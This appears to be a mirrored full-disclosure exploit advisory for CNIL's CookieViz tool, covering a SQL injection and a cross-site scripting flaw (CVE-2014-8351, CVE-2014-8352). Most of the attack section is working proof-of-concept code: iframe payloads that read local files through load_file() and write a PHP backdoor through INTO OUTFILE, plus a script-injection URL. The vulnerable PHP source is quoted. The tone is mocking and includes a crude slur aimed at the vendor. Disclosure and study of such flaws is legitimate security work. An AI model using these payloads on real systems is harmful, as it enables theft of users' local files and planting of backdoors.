@@ -1,0 +1,156 @@
+id: 22818
+date: 11/05/2014
+title: CNIL CookieViz Cross Site Scripting / SQL Injection Vulnerabilities
+author: iliketurtles
+cves: CVE-2014-8351, CVE-2014-8352
+
+# CNIL CookieViz XSS + SQL injection leading to user pwnage
+#
+# Product link:         https://github.com/LaboCNIL/CookieViz
+# CVE references        CVE-2014-8351, CVE-2014-8352
+
+TL;DR
+-----
+Since October 2014, the French National Commission on Informatics and 
+Liberty "CNIL" is performing some controls upon "tracing cookies" (ads, 
+webaudience etc.) set by French websites:  
+http://www.cnil.fr/linstitution/actualite/article/article/cookies-des-controles-a-partir-doctobre/
+In order for private individuals to know what cookies are upon browsing 
+teh interwebz, CNIL "experts" generously released the "CookieViz" tool, 
+which is compatible with most of modern Operating Systems (Windows, 
+Linux, OS X):
+- 
+http://www.cnil.fr/vos-droits/vos-traces/les-cookies/telechargez-cookieviz/
+- https://github.com/LaboCNIL/CookieViz
+
+Anyone can thus use this tool to check potential tracing infringements.
+While this intention is definitely laudable, the produced code is 
+dreadful and riddled with ridiculous security vulnerabilities: XSS, SQL 
+injections and security misconfigurations which can lead to a data 
+leakage of the user's files and potentially a compromise by pushing 
+malicious files on his system.
+
+For an organism fighting for citizens' data privacy...exposing them to 
+security troubles is the height of irony.
+
+
+PoC
+---
+CookieViz is based on 2 components:
+- A cookie harvester, which is basically a grep on tshark with http 
+filters on;
+- A cookie visualizer, which is a more or less fancy HTML GUI relying on 
+d3js.
+
+The 2 components are:
+- Packaged in a standalone WAMP environment for Windows: both components 
+are notably using the root MySQL account with all privileges (hello 
+FILE), PHP magic quotes are off and so on...
+- Unpackaged for Linux and Mac OS environments: you have to integrate 
+them in your own (L|M)AMP. In this case, vuln impacts rely only on you 
+and your setup.
+
+The following PoC only focuses on Windows.
+The scenario is:
+0. You install the standalone package;
+1. You visit a Website in order to check for its cookies. This website 
+includes malicious resources, like in an iframe, which can for instance:
+    1.a) read arbitrary local files;
+    1.b) write any content to non-existing files: you would directly 
+execute arbitrary code on the victim's system but interesting PHP 
+functions like shell_exec(), exec(), passthru() etc. are explicitly 
+disabled in the php.ini
+2. You get pwned as the malicious resources are locally executed
+
+
+> SQLi injection: CVE-2014-8351
+-----------------
+On your malicious website, create an HTML file containing one of these 
+payloads:
+
+1.a)
+<!DOCTYPE html>
+<html>
+<body>
+<p>Reading arbitrary local file - C:\CookieViz\conf\php.ini :</p>
+  <iframe src="http://localhost:81/cookie_viz/info.php?domain=*' union 
+all select 
+@@version,2,3,4,5,6,1,load_file('C:\\CookieViz\\conf\\php.ini'),9 -- 
+/**">
+  </iframe>
+</body>
+</html>
+
+
+1.b) Inb4 : '<?PHP echo "Im pwned " ?>'  is converted to a string with 
+MySQL CHAR() function
+<!DOCTYPE html>
+<html>
+<body>
+<p>Inserting arbitrary PHP code in C:\CookieViz\www\backdoor.php :</p>
+  <iframe src="http://localhost:81/cookie_viz/info.php?domain=*' union 
+all select @@version,2,3,4,5,6,7,CHAR(39, 60, 63, 80, 72, 80, 32, 101, 
+99, 104, 111, 32, 34, 73, 109, 32, 112, 119, 110, 101, 100, 32, 34, 32, 
+63, 62, 39),9 INTO outfile 'C:\\CookieViz\\www\\backdoor.php' -- /**">
+  </iframe>
+</body>
+</html>
+
+2) Visit your HTML page with the standalone package browser.
+3) Profit.
+
+
+> XSS: CVE-2014-8352
+-----
+http://localhost/cookieviz/json.php?max_date="><script>alert(1)</script>
+
+
+Vuln details
+-------
+> SQLi injections:
+-----------------
+info.php, line 21:
+
+  if(isset($_GET["domain"]))
+  {
+    $domain = $_GET["domain"];
+  }
+  [...]
+  $query="SELECT * FROM url_referer WHERE 
+referer_domains='".$domain."'GROUP BY url_domains, referer_domains";
+  $result = mysql_query($query) or die ("Echec de la requête : ".$query." 
+". mysql_error());
+  while ($line = mysql_fetch_assoc($result))
+  {
+    echo "<tr>";
+    if ($line["is_cookie"] == 1)
+    {
+      echo "<td>".$line["referer_domains"];
+      echo "<td>".$line["url_domains"];
+      echo "<td>".$line["cookie"];
+    }
+    echo "</tr>";
+  }
+
+
+> XSS:
+-----
+json.php, line 253:
+
+  print 
+'{"inf_nodes":'.$write_nodes.',"inf_links":'.$write_links.',"max_date":"'.$max_date.'","cpt":'.$cpt.'}';
+
+Solution
+--------
+- Slutshame CNIL
+- Wait for patches
+
+
+Timeline
+--------
+Oct 16, 2014: Getting to know that CNIL released a tool. Visiting the 
+project page and laughing a bit
+Oct 17, 2014: Requiring CVE, just for trolling purposes
+Nov 03, 2014: Going fulldisclo, still for trolling purposes
+
+#  0day.today [2023-03-23]  #
